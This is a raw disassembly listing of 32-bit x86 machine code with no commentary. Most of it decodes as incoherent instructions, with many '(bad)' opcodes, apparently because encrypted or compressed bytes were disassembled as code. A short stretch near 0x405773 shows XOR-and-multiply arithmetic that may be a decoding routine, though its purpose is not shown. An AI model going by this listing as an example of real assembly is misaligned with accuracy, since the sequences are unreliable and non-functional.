  40519d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40519e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40519f:	popf   
  4051a0:	test   eax,0xe7ee3a18
  4051a5:	push   es
  4051a6:	mov    dl,0x52
  4051a8:	scas   eax,DWORD PTR es:[edi]
  4051a9:	inc    edi
  4051aa:	(bad)  
  4051ab:	repnz jecxz 0x405142
  4051ae:	fisttp QWORD PTR [edx+0x762408eb]
  4051b4:	sub    ah,cl
  4051b6:	dec    eax
  4051b7:	retf   
  4051b8:	and    DWORD PTR [ebp-0x6e],eax
  4051bb:	add    al,0xac
  4051bd:	mov    ah,0xe0
  4051bf:	mov    bh,0x9d
  4051c1:	adc    esp,esp
  4051c3:	lahf   
  4051c4:	into   
  4051c5:	scas   al,BYTE PTR es:[edi]
  4051c6:	add    al,0xb1
  4051c8:	cmp    eax,0xe52ca4ce
  4051cd:	icebp  
  4051ce:	sahf   
  4051cf:	mov    al,ds:0x35df9fa5
  4051d4:	ins    DWORD PTR es:[edi],dx
  4051d5:	dec    ebp
  4051d6:	jae    0x4051ad
  4051d8:	jo     0x405229
  4051da:	sub    eax,0x18e73d0
  4051df:	enter  0x519c,0xa
  4051e3:	cmp    dh,BYTE PTR [eax]
  4051e5:	dec    esi
  4051e6:	test   BYTE PTR [edi],ch
  4051e8:	fisub  WORD PTR [edx+0x24ecfbdf]
  4051ee:	in     eax,dx
  4051ef:	or     DWORD PTR [esi-0x3fd11afd],ebp
  4051f5:	cwde   
  4051f6:	aad    0x4f
  4051f8:	push   ds
  4051f9:	test   eax,0x210a81a7
  4051fe:	loopne 0x4051d1
  405200:	sbb    edx,esp
  405202:	(bad)  
  405204:	aam    0xf1
  405206:	enter  0x4a8e,0xb9
  40520a:	loope  0x405232
  40520c:	mov    esi,0xebbd2a19
  405211:	aas    
  405212:	push   cs
  405213:	jp     0x4051e2
  405215:	xchg   BYTE PTR [ecx],cl
  405217:	sub    esp,DWORD PTR [edi+0x21]
  40521a:	jmp    0x4051ad
  40521c:	mov    ah,dh
  40521e:	inc    ebx
  40521f:	loopne 0x405225
  405221:	stos   DWORD PTR es:[edi],eax
  405222:	mov    ah,0x6a
  405224:	mov    bl,0x97
  405226:	addr16 xor esp,ecx
  405229:	add    al,0x7
  40522b:	stos   DWORD PTR es:[edi],eax
  40522c:	rol    DWORD PTR [eax],0x73
  40522f:	adc    al,0x94
  405231:	xchg   edi,eax
  405232:	dec    ebx
  405233:	push   ebx
  405234:	mov    dh,0x7c
  405236:	sbb    ebx,DWORD PTR [edi]
  405238:	add    esi,DWORD PTR ds:0x63e3353d
  40523e:	and    cl,bl
  405240:	in     eax,0x40
  405242:	jo     0x4051c6
  405244:	inc    ecx
  405245:	stc    
  405246:	rol    DWORD PTR [ebp+eax*1-0x78],1
  40524a:	jmp    0x405247
  40524c:	neg    BYTE PTR [ecx]
  40524e:	mov    BYTE PTR [edx-0x49caadcc],0x63
  405255:	dec    eax
  405256:	add    dl,BYTE PTR [esi+0x7c]
  405259:	popa   
  40525a:	push   cs
  40525b:	pop    esp
  40525c:	xor    eax,0xa5813e58
  405261:	mov    ds:0xd76e1499,al
  405266:	adc    DWORD PTR [edi-0x68],0x56e074e7
  40526d:	dec    ebp
  40526e:	cwde   
  40526f:	pop    eax
  405270:	sbb    eax,0xc95edb6
  405275:	clc    
  405276:	mov    al,BYTE PTR [ebp-0x7c13eab5]
  40527c:	xchg   ebx,eax
  40527d:	mov    ?,esi
  40527f:	push   eax
  405280:	xchg   BYTE PTR [esi-0x79d60ccf],dl
  405286:	sbb    dh,cl
  405288:	push   edx
  405289:	clc    
  40528a:	test   BYTE PTR [edi+edx*8-0x6be76939],ah
  405291:	push   ebp
  405292:	sub    dh,BYTE PTR [ebp+0x3ca8ce24]
  405298:	outs   dx,BYTE PTR ds:[esi]
  405299:	dec    esi
  40529a:	pop    ecx
  40529b:	jns    0x405230
  40529d:	xor    BYTE PTR [esi-0x24b935b9],dl
  4052a3:	clc    
  4052a4:	lds    esi,FWORD PTR ds:0x5273e777
  4052aa:	shl    WORD PTR [eax-0x6f18260],cl
  4052b1:	dec    edi
  4052b2:	xchg   esi,eax
  4052b3:	mov    esp,0x86710aa9
  4052b8:	xchg   edx,eax
  4052b9:	popa   
  4052ba:	in     al,dx
  4052bb:	idiv   BYTE PTR ds:0xa080f2fc
  4052c1:	cwde   
  4052c2:	xor    eax,0x9b3667db
  4052c7:	pop    esp
  4052c8:	jae    0x4052f3
  4052ca:	jb     0x40528b
  4052cc:	test   BYTE PTR [esi-0x16],0xbe
  4052d0:	and    esp,edi
  4052d2:	dec    ecx
  4052d3:	cmp    BYTE PTR [ecx+0xc85c476],ch
  4052d9:	xchg   esp,eax
  4052da:	retf   0x5170
  4052dd:	push   0xab9c3097
  4052e2:	cmp    al,0xec
  4052e4:	add    dh,al
  4052e6:	or     dh,ch
  4052e8:	dec    edi
  4052e9:	mul    DWORD PTR [eax]
  4052eb:	mov    ds:0x8b45816c,eax
  4052f0:	daa    
  4052f1:	cmp    BYTE PTR [edi],ah
  4052f3:	aam    0x10
  4052f5:	push   ebp
  4052f6:	fs mov al,0x3f
  4052f9:	mov    ch,0x71
  4052fb:	jae    0x4052ea
  4052fd:	push   cs
  4052fe:	jb     0x405314
  405300:	push   0xffffff9c
  405302:	rcr    al,cl
  405304:	in     al,dx
  405305:	daa    
  405306:	xchg   ecx,eax
  405307:	aas    
  405308:	shl    BYTE PTR es:[edx],1
  40530b:	jnp    0x405387
  40530d:	xchg   edx,ebx
  40530f:	mov    WORD PTR ds:0x7a6bea87,?
  405315:	inc    ax
  405317:	push   ecx
  405318:	ss pop ebp
  40531a:	inc    edx
  40531b:	lock mov ss:0x2af7cec,al
  405322:	in     eax,dx
  405323:	or     al,0x85
  405325:	pop    ss
  405326:	test   al,al
  405328:	fild   DWORD PTR [ebp-0x2]
  40532b:	xchg   ebx,esp
  40532d:	inc    edi
  40532e:	jl     0x405391
  405330:	daa    
  405331:	dec    esp
  405332:	daa    
  405333:	cld    
  405334:	and    eax,0x4c149b5a
  405339:	pop    es
  40533a:	mov    al,ds:0x1680e186
  40533f:	hlt    
  405340:	fistp  QWORD PTR [ebp-0x70]
  405343:	and    bl,BYTE PTR [ecx-0xf451375]
  405349:	bound  esp,QWORD PTR [ecx+0x3ab121cb]
  40534f:	out    0x67,al
  405351:	bound  ecx,QWORD PTR [edi-0x6edb8aab]
  405357:	pop    ebx
  405358:	dec    edx
  405359:	xor    al,dl
  40535b:	iret   
  40535c:	enter  0x3ec9,0x23
  405360:	mov    ebx,0x7239c701
  405366:	popa   
  405367:	sbb    BYTE PTR [esi],al
  405369:	(bad)  
  40536a:	pop    ebx
  40536b:	xchg   edx,eax
  40536c:	xchg   BYTE PTR [ebx],dh
  40536e:	add    ebx,0xeca9ddb
  405374:	int3   
  405375:	adc    al,0xc8
  405377:	das    
  405378:	(bad)  
  40537a:	pop    ds
  40537b:	je     0x405381
  40537d:	and    al,0xbf
  40537f:	inc    ecx
  405380:	es push cs
  405382:	leave  
  405383:	scas   eax,DWORD PTR es:[edi]
  405384:	and    BYTE PTR [edi+0x40],0xde
  405388:	lock xchg edx,eax
  40538a:	aad    0xd8
  40538c:	add    ebx,ebx
  40538e:	inc    edx
  40538f:	jge    0x4053b9
  405391:	add    eax,0x192b2b55
  405396:	addr16 retf 0x7dea
  40539a:	gs leave 
  40539c:	mov    ah,cl
  40539e:	arpl   cx,ax
  4053a0:	mov    gs,WORD PTR [esi]
  4053a2:	cmc    
  4053a3:	xchg   esi,eax
  4053a4:	add    BYTE PTR [esi-0x77],bh
  4053a7:	test   bh,0x27
  4053aa:	cld    
  4053ab:	shl    bh,1
  4053ad:	cdq    
  4053ae:	imul   DWORD PTR [edi-0x24bf7771]
  4053b4:	sub    DWORD PTR [ecx],esp
  4053b6:	sbb    DWORD PTR [ecx+0x20],ebp
  4053b9:	xchg   ecx,eax
  4053ba:	dec    ecx
  4053bb:	fidiv  DWORD PTR [esp+edx*1]
  4053be:	mov    cl,0xcf
  4053c0:	out    0x26,eax
  4053c2:	jmp    0xc852:0xc43d8405
  4053c9:	and    dl,bl
  4053cb:	aam    0xd5
  4053cd:	push   ds
  4053ce:	leave  
  4053cf:	aad    0xa7
  4053d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053d2:	cmc    
  4053d3:	cmp    al,0x67
  4053d5:	out    0xe8,al
  4053d7:	frndint 
  4053d9:	add    ecx,DWORD PTR [edx]
  4053db:	sub    ah,BYTE PTR [ebp+0x75c0be24]
  4053e1:	fsub   QWORD PTR [eax+eax*2]
  4053e4:	jmp    0x40538f
  4053e6:	repnz inc ebp
  4053e8:	cmp    eax,0x8b9298ef
  4053ed:	enter  0xea24,0xc1
  4053f1:	inc    ebp
  4053f2:	aaa    
  4053f3:	add    edi,DWORD PTR [ecx-0x5e]
  4053f6:	jmp    0x405410
  4053f8:	mov    dl,0xea
  4053fa:	outs   dx,DWORD PTR ds:[esi]
  4053fb:	sub    BYTE PTR [edx-0x259db469],cl
  405401:	ja     0x405475
  405403:	dec    esp
  405404:	add    BYTE PTR [eax+ecx*2-0x7b],ch
  405408:	rol    BYTE PTR [ecx-0x2f],0x44
  40540c:	pop    esp
  40540d:	lahf   
  40540e:	mov    bh,0xff
  405410:	adc    al,0x93
  405412:	aaa    
  405413:	out    0x65,al
  405415:	pop    ds
  405416:	(bad)  
  405417:	push   eax
  405418:	jle    0x405498
  40541a:	inc    edi
  40541b:	shl    DWORD PTR [eax],1
  40541d:	push   esi
  40541e:	push   esp
  40541f:	shl    dh,cl
  405421:	in     eax,dx
  405422:	sbb    dh,BYTE PTR [esi-0x3bf507ef]
  405428:	into   
  405429:	xchg   BYTE PTR [ebx+0x33],dl
  40542c:	cmp    BYTE PTR [edx-0x51],bl
  40542f:	mov    DWORD PTR [ebp+ebx*4-0x31],edx
  405433:	or     DWORD PTR [edx+0x3dcdb75c],edx
  405439:	pushf  
  40543a:	sbb    eax,0x6e35f65c
  40543f:	(bad)  
  405440:	sahf   
  405441:	cmp    dl,BYTE PTR [ecx]
  405443:	dec    ecx
  405444:	ins    BYTE PTR es:[edi],dx
  405445:	stos   DWORD PTR es:[edi],eax
  405446:	pop    ecx
  405447:	jae    0x405413
  405449:	add    dh,BYTE PTR [ebx-0x80]
  40544c:	cmc    
  40544d:	mov    edi,0xc65a809f
  405452:	mov    esp,0x6aba6d7c
  405457:	imul   ebp,DWORD PTR [esi],0xfffffffa
  40545a:	inc    esi
  40545b:	scas   eax,DWORD PTR es:[edi]
  40545c:	rol    DWORD PTR [ecx-0x2c],1
  40545f:	leave  
  405460:	imul   edx,DWORD PTR [edi-0x2b],0x860ffa3b
  405467:	push   ebp
  405468:	idiv   bh
  40546a:	dec    DWORD PTR [ebx+0x7d8bf455]
  405470:	fsub   st(1),st
  405472:	inc    BYTE PTR [edx]
  405474:	add    BYTE PTR [eax],al
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x32f40448]
  405484:	out    0x43,al
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054f8
  40548f:	stos   BYTE PTR es:[edi],al
  405490:	add    BYTE PTR [ebx+ebp*1-0x5a],0xee
  405495:	ror    DWORD PTR [esi-0x18],0xfe
  405499:	clc    
  40549a:	xor    BYTE PTR [ecx-0x42],ch
  40549d:	js     0x4054ee
  40549f:	hlt    
  4054a0:	or     BYTE PTR [eax+0x2f],bl
  4054a3:	cli    
  4054a4:	fucomi st,st(6)
  4054a6:	xor    bh,BYTE PTR [edx-0x5af194a2]
  4054ac:	xchg   ebp,eax
  4054ad:	lds    eax,FWORD PTR [ebp+0x7c20fe15]
  4054b3:	das    
  4054b4:	(bad)  
  4054b5:	fidivr WORD PTR [ecx-0x1c50a974]
  4054bb:	mov    ds:0xc32f43fa,eax
  4054c0:	aad    0x3
  4054c2:	call   0xa9a8e7da
  4054c7:	sbb    ecx,DWORD PTR [ebx+0x2b]
  4054ca:	add    al,0x4e
  4054cc:	(bad)  
  4054cd:	xchg   ebp,eax
  4054ce:	outs   dx,DWORD PTR ds:[esi]
  4054cf:	inc    eax
  4054d0:	test   eax,0x2a4a6d34
  4054d5:	pop    edi
  4054d6:	fst    st(3)
  4054d8:	shl    BYTE PTR [eax-0x3d],0x8f
  4054dc:	dec    esp
  4054dd:	sub    DWORD PTR [esi],ebx
  4054df:	mov    eax,ds:0x62e0cfa7
  4054e4:	push   ebp
  4054e5:	adc    eax,0xab687907
  4054ea:	sahf   
  4054eb:	outs   dx,DWORD PTR ds:[esi]
  4054ec:	mov    al,ds:0xde311ce8
  4054f1:	(bad)  
  4054f2:	(bad)  [edx]
  4054f4:	pop    edi
  4054f5:	push   ss
  4054f6:	push   ebp
  4054f7:	cmp    esp,ebx
  4054f9:	ins    BYTE PTR es:[edi],dx
  4054fa:	test   DWORD PTR [esi],esi
  4054fc:	aad    0xc9
  4054fe:	cmp    eax,0x5ef76d3e
  405503:	(bad)  
  405505:	pop    esp
  405506:	add    dl,bl
  405508:	sbb    BYTE PTR [ecx-0x26a8e4ed],ah
  40550e:	ror    DWORD PTR [edi-0x1d],1
  405511:	adc    cl,dl
  405513:	jl     0x4054ed
  405515:	and    BYTE PTR [eax+0x6f46333c],cl
  40551b:	aad    0xd
  40551d:	pusha  
  40551e:	int3   
  40551f:	dec    edx
  405520:	popa   
  405521:	sbb    al,0x52
  405523:	push   esp
  405524:	iret   
  405525:	sbb    al,dl
  405527:	xlat   BYTE PTR ds:[ebx]
  405528:	fbstp  TBYTE PTR [eax+0x7328e6c7]
  40552e:	sar    esi,0x17
  405531:	std    
  405532:	cmp    DWORD PTR [edi+0x7e],esp
  405535:	stc    
  405536:	out    0xc3,al
  405538:	out    0x25,eax
  40553a:	nop
  40553b:	pop    es
  40553c:	push   eax
  40553d:	sub    esi,0xcca419b
  405543:	loope  0x40555e
  405545:	xor    eax,0x4dcd26e9
  40554a:	add    DWORD PTR [edi-0x2be06c10],0x63
  405551:	jp     0x40559e
  405553:	mov    al,0xdc
  405555:	fsub   DWORD PTR [edi-0x7c]
  405558:	push   ebx
  405559:	bound  edx,QWORD PTR [ebx]
  40555b:	cmp    DWORD PTR [ecx+0x67872a90],edi
  405561:	mov    eax,0x92913b2e
  405566:	popf   
  405567:	call   0x6d84:0x236fea09
  40556e:	call   FWORD PTR [edi-0x5]
  405571:	mov    eax,0xd175f59
  405576:	jno    0x405597
  405578:	add    eax,0xbdeccbfa
  40557d:	add    DWORD PTR [di+0x60],ebx
  405581:	pop    esi
  405582:	ret    
  405583:	loopne 0x40555c
  405585:	in     al,dx
  405586:	xchg   edi,eax
  405587:	cmc    
  405588:	rcl    BYTE PTR [ebx-0x7d],0x35
  40558c:	addr16 nop
  40558e:	(bad)  
  405590:	sbb    ch,BYTE PTR [ebp+0x5763430f]
  405596:	sti    
  405597:	popa   
  405598:	int3   
  405599:	mov    al,ds:0x2e8cec41
  40559e:	adc    BYTE PTR [edi-0x3b],0x3e
  4055a2:	stos   DWORD PTR es:[edi],eax
  4055a3:	xchg   edi,eax
  4055a4:	in     al,0xfb
  4055a6:	xchg   edi,eax
  4055a7:	sub    ebp,DWORD PTR [ecx+ebx*2]
  4055aa:	jge    0x4055e0
  4055ac:	scas   eax,DWORD PTR es:[edi]
  4055ad:	inc    esi
  4055ae:	int    0xf8
  4055b0:	mov    DWORD PTR [edx],edx
  4055b2:	imul   esp,DWORD PTR [ebx+0x2069e3da],0xcb63a8f6
  4055bc:	lahf   
  4055bd:	out    dx,eax
  4055be:	lock (bad) 
  4055c0:	mov    al,ds:0xab0815b4
  4055c5:	leave  
  4055c6:	sub    eax,0xc22d7fb6
  4055cb:	mov    edi,0x660ab028
  4055d0:	mov    ebp,0xf201f6eb
  4055d5:	leave  
  4055d6:	ret    0x7724
  4055d9:	xchg   esp,eax
  4055da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055db:	(bad)  
  4055dc:	js     0x4055ec
  4055de:	popa   
  4055df:	pop    es
  4055e0:	add    BYTE PTR [ecx],ah
  4055e2:	mov    ch,0xf2
  4055e4:	es mov edi,0xd3dc7e30
  4055ea:	push   es
  4055eb:	xchg   ecx,eax
  4055ec:	fdiv   QWORD PTR [edi]
  4055ee:	adc    ebx,0xfb80d1f0
  4055f4:	pop    esp
  4055f5:	mov    al,0x2e
  4055f7:	add    DWORD PTR [eax+eiz*4],edx
  4055fa:	dec    esp
  4055fb:	dec    ebx
  4055fc:	adc    eax,0x4f57c549
  405601:	xor    eax,0xff381c64
  405606:	clc    
  405607:	xor    DWORD PTR [eax-0x5e80466],edx
  40560d:	adc    eax,0x5ed8f5e1
  405612:	mov    BYTE PTR [eax],0x2b
  405615:	xor    bl,BYTE PTR [ecx-0x58]
  405618:	out    dx,eax
  405619:	outs   dx,DWORD PTR ds:[esi]
  40561a:	retf   0xc713
  40561d:	xchg   DWORD PTR [edx+0x6],esi
  405620:	ror    DWORD PTR [ecx-0x2d8ae583],0xfb
  405627:	push   edx
  405628:	sti    
  405629:	or     dh,cl
  40562b:	cvtps2pi mm3,QWORD PTR [ebx+0x77]
  40562f:	mov    bh,0x60
  405631:	dec    ebp
  405632:	jle    0x4055eb
  405634:	(bad)  
  405635:	rcr    cl,0x4a
  405638:	pusha  
  405639:	xlat   BYTE PTR ds:[ebx]
  40563a:	xor    ecx,edi
  40563c:	mov    bh,BYTE PTR [eax+ecx*2]
  40563f:	test   DWORD PTR [ebx+0x2c],0xb83100a5
  405646:	pop    eax
  405647:	mov    ebx,0x1556d581
  40564c:	fcmovbe st,st(7)
  40564f:	out    0xa3,al
  405651:	push   0x40
  405653:	and    eax,0xb77bf23f
  405658:	sti    
  405659:	jae    0x405674
  40565b:	(bad)  
  40565c:	shl    DWORD PTR [edx-0x6800b0e8],cl
  405662:	xchg   ebp,eax
  405663:	je     0x40567b
  405665:	cmp    al,0xed
  405667:	in     al,dx
  405668:	fdivp  st(1),st
  40566a:	es dec ebx
  40566c:	cmp    eax,0x89b878d8
  405671:	ins    DWORD PTR es:[edi],dx
  405672:	sbb    ch,bl
  405674:	push   ss
  405675:	retf   
  405676:	xor    al,0xd8
  405678:	(bad)  
  405679:	cmp    BYTE PTR [edi+edi*8+0x24],dh
  40567d:	xlat   BYTE PTR ds:[ebx]
  40567e:	(bad)  
  40567f:	xchg   esp,eax
  405680:	mov    eax,0x6ee046c0
  405685:	xchg   edx,eax
  405686:	popa   
  405687:	das    
  405688:	pop    esp
  405689:	add    ah,BYTE PTR [ebp-0x3760979a]
  40568f:	test   al,0x6b
  405692:	dec    esi
  405693:	jp     0x40567e
  405695:	lods   eax,DWORD PTR ds:[esi]
  405696:	test   BYTE PTR [eax+0x49c1dec9],ah
  40569c:	dec    esi
  40569d:	out    0xce,eax
  40569f:	push   es
  4056a0:	mov    esi,0xf5d96451
  4056a5:	dec    eax
  4056a6:	jmp    0xf286:0xe7c6e8a2
  4056ad:	mov    bl,0x80
  4056af:	and    bh,BYTE PTR [eax+0x54]
  4056b2:	js     0x405667
  4056b4:	push   ds
  4056b5:	xchg   ebp,eax
  4056b6:	lahf   
  4056b7:	sub    DWORD PTR [edx+esi*8-0x113eb3ff],ecx
  4056be:	repz retf 
  4056c0:	xor    DWORD PTR [esi+0x2d3fd897],ecx
  4056c6:	jbe    0x40572c
  4056c8:	test   BYTE PTR [edx-0x67],bh
  4056cb:	bound  edi,QWORD PTR [ebx]
  4056cd:	das    
  4056ce:	daa    
  4056cf:	mov    bh,0x32
  4056d1:	out    dx,eax
  4056d2:	pusha  
  4056d3:	mov    ch,0x7d
  4056d5:	ret    
  4056d6:	mov    BYTE PTR [esi+eax*4],ah
  4056d9:	push   cs
  4056da:	sti    
  4056db:	cmp    eax,0xad4728f7
  4056e0:	and    dl,BYTE PTR [edi+0x13]
  4056e3:	(bad)  [esi]
  4056e5:	pusha  
  4056e6:	(bad)  
  4056e7:	mov    ebp,DWORD PTR [edx-0x55a99a40]
  4056ed:	xchg   edi,eax
  4056ee:	stc    
  4056ef:	fs jnp 0x4056cd
  4056f2:	and    BYTE PTR ds:0x65d0720d,al
  4056f8:	repnz (bad) 
  4056fa:	jge    0x40575a
  4056fc:	mov    dl,0xea
  4056fe:	xchg   ebx,eax
  4056ff:	adc    DWORD PTR [ebp+0x42df5896],esi
  405705:	enter  0x578e,0xf8
  405709:	mov    ch,0xeb
  40570b:	(bad)  
  40570c:	push   edi
  40570d:	pop    ebp
  40570e:	mov    BYTE PTR cs:[edx+0x5940e620],dl
  405715:	jmp    0x7f56:0xe3b39440
  40571c:	bound  eax,QWORD PTR [ecx+0x28]
  40571f:	jl     0x405756
  405721:	dec    DWORD PTR [edx]
  405723:	cwde   
  405724:	mov    al,ds:0x5ac5cf0a
  405729:	mov    eax,DWORD PTR [edi]
  40572b:	jmp    0x4056fd
  40572d:	(bad)  
  40572e:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  405730:	push   0x5821e650
  405735:	and    BYTE PTR [ecx+edx*1-0x13],cl
  405739:	test   al,0x56
  40573b:	fisttp WORD PTR [edx*4+0x6b657a9d]
  405742:	gs mov edx,0x15932f41
  405748:	dec    edi
  405749:	sbb    DWORD PTR [edx+0x40],esi
  40574c:	xchg   DWORD PTR [esi-0x4a],edx
  40574f:	jmp    0xb0ea7ef0
  405754:	clc    
  405755:	sbb    BYTE PTR [esi],dh
  405757:	mov    bl,0xec
  405759:	mov    dl,0xaf
  40575b:	addr16 call 0x99ac:0xaba4d8e7
  405763:	test   eax,0xd37677f7
  405768:	push   esi
  405769:	jns    0x40572e
  40576b:	(bad)  
  40576c:	mov    al,0xf1
  40576e:	outs   dx,BYTE PTR ds:[esi]
  40576f:	in     eax,0xe4
  405771:	push   ss
  405772:	clc    
  405773:	es xor edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43389b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4337a3,0x433783
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4337df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xa7
  4057f5:	mov    al,ds:0x363ad325
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	mov    ch,0x4e
  405802:	shl    dl,cl
  405804:	adc    cl,dl
  405806:	pop    ebp
  405807:	xchg   edx,eax
  405808:	jecxz  0x405876
  40580a:	jo     0x4057e3
  40580c:	or     esp,ecx
  40580e:	mov    eax,DWORD PTR [edi-0x711e9d7d]
  405814:	pop    edx
  405815:	mov    bh,0x9d
  405817:	stos   BYTE PTR es:[edi],al
  405818:	cmp    BYTE PTR [edx+0x31],0xfa
  40581c:	or     al,0xc1
  40581e:	pop    edx
  40581f:	dec    ebx
  405820:	adc    BYTE PTR [ebp+0x892f426],bl
  405826:	xor    BYTE PTR [ebx],cl
  405828:	xchg   DWORD PTR [ebx-0x6a],edi
  40582b:	inc    eax
  40582c:	pop    ecx
  40582d:	and    ebx,ebp
  40582f:	sbb    ebp,DWORD PTR ds:0xbda46ede
  405835:	cdq    
  405836:	cdq    
  405837:	pop    eax
  405838:	xor    eax,0xdae75ddb
  40583d:	cmp    ch,ah
  40583f:	pop    esi
  405840:	pushf  
  405841:	xchg   ebx,eax
  405842:	push   esi
  405843:	bound  ecx,QWORD PTR [eax-0x5c]
  405846:	push   eax
  405847:	inc    ebp
  405848:	and    dl,BYTE PTR [ecx-0x7cf64d54]
  40584e:	imul   ecx,esi,0xffffff86
  405851:	scas   al,BYTE PTR es:[edi]
  405852:	add    ch,BYTE PTR [edi-0x76]
  405855:	test   eax,0xe7871fe0
  40585a:	mov    bh,0x5e
  40585c:	mov    gs,WORD PTR [esi+0x4dd25b31]
  405862:	push   es
  405863:	into   
  405864:	and    edi,edx
  405866:	xchg   esp,eax
  405867:	dec    ebp
  405868:	mov    eax,0xe6d18ca5
  40586d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40586e:	fs inc edi
  405870:	pop    es
  405871:	aad    0x6f
  405873:	inc    ebp
  405874:	sub    edx,ecx
  405876:	or     esp,esi
  405878:	test   al,0x1d
  40587a:	mov    ds,WORD PTR [ecx-0x1974e8d8]
  405880:	ficomp DWORD PTR [eax+0xbe4939a]
  405886:	ds retf 0xecea
  40588a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40588b:	rol    cl,0xcd
  40588e:	or     dl,BYTE PTR [ebp+0x11]
  405891:	mov    eax,ds:0x386e76b9
  405896:	dec    edi
  405897:	mov    al,ds:0x3bdeaa05
  40589c:	push   0x6d
  40589e:	and    edx,ebp
  4058a0:	pop    ebx
  4058a1:	or     DWORD PTR [edx],0xa05303c9
  4058a7:	xchg   esi,eax
  4058a8:	stos   DWORD PTR es:[edi],eax
  4058a9:	pop    eax
  4058aa:	add    al,0xa6
  4058ac:	lods   al,BYTE PTR ds:[esi]
  4058ad:	adc    DWORD PTR [ebx+0x67bc376e],esi
  4058b3:	js     0x4058c1
  4058b5:	lock ret 
  4058b7:	test   cl,cl
  4058b9:	jns    0x4058fa
  4058bb:	in     al,dx
  4058bc:	in     al,dx
  4058bd:	sub    esp,0xc2e08c36
  4058c3:	ss dec edx
  4058c5:	add    al,0xe2
  4058c7:	(bad)  
  4058c8:	mov    ah,BYTE PTR [edi]
  4058ca:	mov    edi,0xbad026a6
  4058cf:	(bad)  [esi+0x31]
  4058d2:	fldenv [ecx-0x4b2b6579]
  4058d8:	nop
  4058d9:	sub    esi,DWORD PTR [esi+0x53]
  4058dc:	stos   BYTE PTR es:[edi],al
  4058dd:	test   eax,0x8d50c966
  4058e2:	enter  0x97ca,0x9a
  4058e6:	xchg   edi,eax
  4058e7:	or     al,0x5
  4058e9:	and    BYTE PTR [eax+0x594f6905],bl
  4058ef:	pop    ecx
  4058f0:	xchg   ebp,eax
  4058f1:	add    bh,BYTE PTR [esi+0x3d]
  4058f4:	push   edi
  4058f5:	ret    
  4058f6:	call   0x847f:0x9c733567
  4058fd:	push   edx
  4058fe:	inc    esp
  4058ff:	or     DWORD PTR [ebx],esi
  405901:	popf   
  405902:	repnz fcmovb st,st(5)
  405905:	sub    ecx,ebx
  405907:	dec    ecx
  405908:	es retf 0x6fe0
  40590c:	cmp    BYTE PTR [esi-0x6e],0xf8
  405910:	icebp  
  405911:	xlat   BYTE PTR ds:[ebx]
  405912:	cld    
  405913:	test   eax,0x72b5d5b0
  405918:	and    ecx,eax
  40591a:	cs loop 0x405960
  40591d:	mov    ch,BYTE PTR [eax-0x47]
  405920:	pop    ecx
  405921:	or     eax,0xa82f9ec0
  405926:	js     0x4058f9
  405928:	push   ebp
  405929:	mov    cl,0xd0
  40592b:	test   BYTE PTR [esi-0x66],cl
  40592e:	(bad)  
  405931:	xor    ebp,edx
  405933:	mov    ss,WORD PTR [edx]
  405935:	mov    dl,0x33
  405937:	mov    dl,0x31
  405939:	(bad)  
  40593a:	xchg   ebp,eax
  40593b:	pusha  
  40593c:	pop    eax
  40593d:	ins    BYTE PTR es:[edi],dx
  40593e:	or     bh,BYTE PTR [ebx-0x78975610]
  405944:	test   bh,bl
  405946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405947:	and    al,0x7a
  405949:	int3   
  40594a:	or     cl,BYTE PTR [eax+0x7a]
  40594d:	xor    eax,edx
  40594f:	adc    ax,0x569a
  405953:	mov    bl,0x3f
  405955:	add    dl,ah
  405957:	add    ebx,esi
  405959:	adc    eax,0x2d9ede3e
  40595e:	and    cl,al
  405960:	push   0x93fae43f
  405965:	jbe    0x4059d9
  405967:	mov    al,0x22
  405969:	or     al,0xc3
  40596b:	dec    ebx
  40596c:	pop    ebx
  40596d:	adc    BYTE PTR [ebx+0x21],ah
  405970:	std    
  405971:	xchg   ebx,eax
  405972:	mov    dh,0x92
  405974:	mov    eax,0x8d6b22ca
  405979:	data16 out dx,al
  40597b:	out    dx,al
  40597c:	dec    esp
  40597d:	test   eax,0x54334284
  405982:	(bad)
  405985:	dec    eax
  405986:	xlat   BYTE PTR ds:[ebx]
